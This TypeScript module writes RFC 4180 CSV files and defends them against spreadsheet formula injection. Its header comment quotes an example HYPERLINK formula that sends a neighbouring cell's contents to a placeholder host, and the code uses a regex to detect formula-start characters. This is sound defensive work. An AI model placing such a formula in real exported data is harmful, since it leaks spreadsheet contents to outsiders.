/**
 * CSV, to RFC 4180 — and defended against the spreadsheet.
 *
 * Two hazards, neither of which is about commas.
 *
 * **Formula injection.** A cell beginning `=`, `+`, `-`, `@`, tab or carriage
 * return is interpreted by Excel, Sheets and LibreOffice as a *formula*, not
 * as text. `=HYPERLINK("http://x/?"&A1,"Click")` in an exported description
 * exfiltrates the row next to it the moment someone opens the file and clicks.
 * Nothing about this is exotic: the attacker only needs to be able to type an
 * entry description, which on a ledger is the point.
 *
 * The fix is to prefix the offending cell with a single quote, which the
 * spreadsheet strips on display and the formula parser never sees. Quoting the
 * field is not enough — a quoted cell is still parsed as a formula.
 *
 * **Encoding.** Excel on Windows assumes the system codepage unless the file
 * opens with a UTF-8 byte-order mark. Without it, every non-ASCII character in
 * an account name arrives as mojibake, and the person exporting concludes the
 * ledger is broken.
 */

const NEEDS_QUOTING = /[",\r\n]/u;

/** Characters a spreadsheet treats as the start of a formula. */
const FORMULA_START = /^[=+\-@\t\r]/u;

export const UTF8_BOM = '﻿';

export function csvCell(value: string | number | null | undefined): string {
  if (value === null || value === undefined) return '';

  const text = String(value);
  // Neutralised before quoting, so the guard survives the escaping.
  const safe = FORMULA_START.test(text) ? `'${text}` : text;

  return NEEDS_QUOTING.test(safe) ? `"${safe.replaceAll('"', '""')}"` : safe;
}

export function csvRow(cells: readonly (string | number | null | undefined)[]): string {
  return cells.map(csvCell).join(',');
}

/**
 * CRLF line endings, because RFC 4180 says so and because Excel's importer is
 * the one consumer that still cares.
 */
export function toCsv(
  header: readonly string[],
  rows: readonly (readonly (string | number | null | undefined)[])[],
): string {
  return `${UTF8_BOM}${[csvRow(header), ...rows.map(csvRow)].join('\r\n')}\r\n`;
}

/**
 * A `Content-Disposition` a browser will honour and a filesystem will accept.
 *
 * Both the plain and the RFC 5987 form, because the plain one cannot carry a
 * non-ASCII character and older clients ignore the encoded one.
 */
export function attachment(filename: string): string {
  const ascii = filename.replaceAll(/[^\w.\-]/gu, '_');
  return `attachment; filename="${ascii}"; filename*=UTF-8''${encodeURIComponent(filename)}`;
}
